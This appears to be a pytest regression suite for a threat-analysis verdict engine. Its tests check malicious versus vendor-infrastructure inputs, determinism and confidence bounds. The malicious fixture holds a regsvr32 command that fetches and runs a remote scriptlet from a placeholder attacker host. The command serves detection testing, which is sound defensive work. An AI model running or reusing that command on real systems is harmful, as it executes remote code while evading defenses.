"""ADR-0014 · Slice-C · Unified Verdict Engine regression tests (§1.1.3).

Locks:
    - One engine writes cio.verdict.
    - Verdict label / confidence derive from the Evidence Graph only.
    - Vendor / CA infra IOCs NEVER drive verdict (§1.1.16 § §1.1.17).
    - Same graph → same verdict (deterministic).
    - Verdict node is written into the graph itself (§1.1.2).
"""
from __future__ import annotations

import pytest

from nivxforge.cim.fact_substrate import (
    DecoderLayer, FactSubstrate, IOCRecord, MITREHit, TIHitRecord,
)
from nivxforge.investigation import build_cio, validate_cio
from nivxforge.investigation.verdict_engine import compute_verdict, VerdictNode


def _malicious_substrate() -> FactSubstrate:
    return FactSubstrate(
        input_text="regsvr32 /u /s /i:http://attacker.example.com/payload.sct",
        input_kind="cmd",
        source_endpoint="/api/decode/smart",
        decoder_chain=[
            DecoderLayer(idx=0, op="powershell-encoded", input_kind="b64",
                         output_kind="text",
                         output_preview="regsvr32 /u /s /i:http://attacker.example.com/payload.sct"),
        ],
        iocs=[
            IOCRecord(kind="url", value="http://attacker.example.com/payload.sct",
                      stage_passed=["syntactic", "context"]),
        ],
        mitre_hits=[
            MITREHit(technique_id="T1218.010", name="Regsvr32", tactic="Defense Evasion"),
            MITREHit(technique_id="T1071.001", name="Web Protocols", tactic="C2"),
        ],
        ti_hits=[],
        reasoning_notes=[
            "Regsvr32 acts as signed-binary proxy for HTTP payload",
            "Malicious disposition confirmed by TI",
        ],
    )


def _benign_substrate() -> FactSubstrate:
    """Only vendor-infra + CA URLs — must NOT trigger a verdict."""
    return FactSubstrate(
        input_text="Cisco Secure Endpoint telemetry",
        input_kind="text",
        source_endpoint="/api/decode/smart",
        decoder_chain=[],
        iocs=[
            IOCRecord(kind="url", value="http://crl.verisign.com/x.crl",
                      stage_passed=["syntactic"]),
            IOCRecord(kind="url", value="https://console.amp.cisco.com/x",
                      stage_passed=["syntactic"]),
            IOCRecord(kind="domain", value="logo.verisign.com",
                      stage_passed=["syntactic"]),
        ],
        mitre_hits=[],
        ti_hits=[],
        reasoning_notes=[],
    )


class TestVerdictShape:
    def test_verdict_node_written_into_graph(self):
        cio = build_cio(_malicious_substrate())
        verdict_nodes = cio.evidence_graph.nodes_by_kind("verdict")
        assert len(verdict_nodes) == 1
        assert cio.verdict["label"] == verdict_nodes[0].value

    def test_cio_verdict_field_populated(self):
        cio = build_cio(_malicious_substrate())
        assert cio.verdict is not None
        assert cio.verdict["engine"] == "unified-verdict-engine-v1"

    def test_reasoning_step_recorded_for_verdict(self):
        cio = build_cio(_malicious_substrate())
        rules = [s.rule for s in cio.reasoning_steps]
        assert "verdict.compute" in rules


class TestVerdictLabel:
    def test_malicious_input_produces_at_least_suspicious(self):
        v = compute_verdict(build_cio(_malicious_substrate()).evidence_graph)
        assert v.label in ("Malicious", "Suspicious", "Runtime Dependent")

    def test_benign_infra_only_never_malicious(self):
        v = compute_verdict(build_cio(_benign_substrate()).evidence_graph)
        assert v.label not in ("Malicious", "Suspicious")
        # Vendor-infra IOCs must appear in not_counted, never in contributors
        assert not v.contributors
        assert v.not_counted


class TestVendorInfraDownweight:
    def test_vendor_and_ca_infra_are_not_counted(self):
        cio = build_cio(_benign_substrate())
        v = compute_verdict(cio.evidence_graph)
        categories = {c.category for c in v.not_counted}
        assert "vendor_infrastructure" in categories or \
               "certificate_infrastructure" in categories

    def test_zero_weight_not_promoted(self):
        cio = build_cio(_benign_substrate())
        v = compute_verdict(cio.evidence_graph)
        assert v.confidence_pct <= 5


class TestDeterminism:
    def test_same_graph_same_verdict(self):
        c1 = build_cio(_malicious_substrate())
        c2 = build_cio(_malicious_substrate())
        assert c1.verdict == c2.verdict


class TestG1G2G4StillHold:
    def test_gates_still_pass_after_verdict(self):
        cio = build_cio(_malicious_substrate())
        validate_cio(cio)


class TestConfidenceBounds:
    def test_confidence_in_range(self):
        for fs in [_malicious_substrate(), _benign_substrate()]:
            v = compute_verdict(build_cio(fs).evidence_graph)
            assert 0.0 <= v.confidence <= 1.0
            assert 0 <= v.confidence_pct <= 100
